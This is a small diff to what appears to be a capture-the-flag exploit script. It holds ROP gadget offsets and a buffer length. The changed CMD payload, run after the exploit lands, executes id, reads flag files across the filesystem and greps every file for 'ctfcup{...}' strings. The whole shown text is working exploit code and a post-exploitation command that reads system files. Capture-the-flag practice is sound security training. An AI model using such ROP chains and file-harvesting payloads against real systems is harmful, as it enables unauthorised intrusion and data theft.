@@ -21,9 +21,10 @@ BLEN = 18 + 1 + 384
 LVT, LRET, PRDI, PRSI, PRAX, SYSC = 0x206db8, 0xcf7b1, 0x1cca4, 0x239af, 0x3b4aa, 0x155ed5
 SEPS = [b"\r\n", b"\n"]
 
-CMD = (b"echo ---PWNED---; id; ls /; ls /app /home 2>/dev/null; "
-       b"cat /flag /flag.txt /app/flag /app/flag.txt /home/*/flag* 2>/dev/null; "
-       b"find / -maxdepth 4 -name 'flag*' 2>/dev/null | head; echo ---END---\n")
+CMD = (b"echo ---PWNED---; id; "
+       b"cat /flag /flag.txt /flag_*.txt /app/flag* /home/*/flag* 2>/dev/null; "
+       b"grep -rho --binary-files=text 'ctfcup{[^}]*}' / 2>/dev/null | head -5; "
+       b"echo ---END---\n")
 
 
 def req(gamma, payload):
